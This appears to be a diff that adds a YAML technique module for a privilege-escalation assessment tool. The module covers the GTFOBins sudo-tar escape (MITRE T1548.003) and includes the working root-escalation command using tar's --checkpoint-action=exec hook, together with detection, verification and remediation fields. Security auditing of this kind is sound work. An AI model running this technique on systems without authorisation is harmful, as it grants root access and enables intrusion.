@@ -1,0 +1,26 @@
+# Sudo → root via tar (GTFOBins)
+# tar's --checkpoint-action=exec runs a command after every N records, so a
+# no-op archive with checkpoint 1 fires the exec exactly once.
+technique: T1548.003
+name: Sudo → root via tar (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: tar
+execute:
+  command: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id'
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `tar` — the --checkpoint-action=exec hook runs an
+    arbitrary command as root when a checkpoint fires (=1 forces one).
+  remediation: Drop `tar` from sudoers.
+  refs: [T1548.003, GTFOBins/tar]
